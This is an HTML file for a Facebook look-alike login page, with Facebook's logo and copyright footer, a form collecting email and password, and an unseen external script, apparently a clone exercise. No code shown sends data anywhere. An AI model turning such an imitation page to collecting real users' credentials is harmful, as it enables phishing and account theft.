<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page</title>
    <script src="fscript.js" defer></script>
    <link rel="stylesheet" href="fstyles.css">
</head>
<body>
    <div>
        <img src="logo-facebookpng.png" alt="Facebook">
    </div>
    <div class="container">
        <div class="text">
            Login to Facebook Account
        </div>
        <div class="login-box">
            <form action="" id="loginForm">
                <div class="input-group">
                    <input type="text" id="email" placeholder="enter your email or username">
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="enter your password">
                </div>
                <button type="submit">Log In</button>
            </form>
        </div>
        <div class="end">
            <span>Forgotten password?</span> 
            <span>Sign Up</span>

        </div>
    </div>
    <footer>
        <div class="center">
            <a href="https://www.facebook.com/login/" target="_blank">Copyright &copy; www.facebook.com All rights reserved!</a>
        </div>
    </footer>
</body>
</html>
